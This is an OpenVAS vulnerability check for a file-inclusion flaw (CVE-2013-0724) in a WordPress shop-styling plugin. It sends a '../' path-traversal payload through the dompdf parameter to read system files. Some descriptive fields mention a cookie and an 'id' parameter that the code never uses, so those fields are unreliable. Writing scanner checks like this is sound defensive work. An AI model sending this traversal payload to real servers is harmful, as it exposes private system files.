###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wp-ecommerce-shop-styling_rfi_vuln.nasl 11867 2018-10-12 10:48:11Z cfischer $
#
# WordPress WP ecommerce Shop Styling 'dompdf' Remote File Inclusion Vulnerability
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (C) 2014 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.804709");
  script_version("$Revision: 11867 $");
  script_cve_id("CVE-2013-0724");
  script_bugtraq_id(57768);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"$Date: 2018-10-12 12:48:11 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2014-07-07 12:27:51 +0530 (Mon, 07 Jul 2014)");
  script_name("WordPress WP ecommerce Shop Styling 'dompdf' Remote File Inclusion Vulnerability");


  script_tag(name:"summary", value:"This host is installed with WordPress WP ecommerce Shop Styling Plugin and
is prone to remote file inclusion vulnerability.");
  script_tag(name:"vuldetect", value:"Send a crafted data via HTTP GET request and check whether it is able to read
cookie or not.");
  script_tag(name:"insight", value:"Input passed via the 'id' HTTP GET parameter to /lp/index.php script is not
properly sanitised before returning to the user.");
  script_tag(name:"impact", value:"Successful exploitation may allow an attacker to obtain sensitive information,
which can lead to launching further attacks.");
  script_tag(name:"affected", value:"WordPress WP ecommerce Shop Styling Plugin version 1.7.2, Other version may
also be affected.");
  script_tag(name:"solution", value:"Upgrade to version 1.8 or higher.");
  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"http://secunia.com/advisories/51707");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/81931");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl", "os_detection.nasl");
  script_mandatory_keys("wordpress/installed");
  script_require_ports("Services/www", 80);
  script_xref(name:"URL", value:"http://wordpress.org/plugins/wp-ecommerce-shop-styling");
  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if(!http_port = get_app_port(cpe:CPE)){
  exit(0);
}

if(!dir = get_app_location(cpe:CPE, port:http_port)){
  exit(0);
}

files = traversal_files();

foreach file (keys(files))
{
  url = dir + '/wp-content/plugins/wp-ecommerce-shop-styling'
            + '/includes/generate-pdf.php?dompdf='
            + crap(data:"../", length:9*6) + files[file];

  if(http_vuln_check(port:http_port, url:url, check_header:TRUE, pattern:file))
  {
    security_message(http_port);
    exit(0);
  }
}
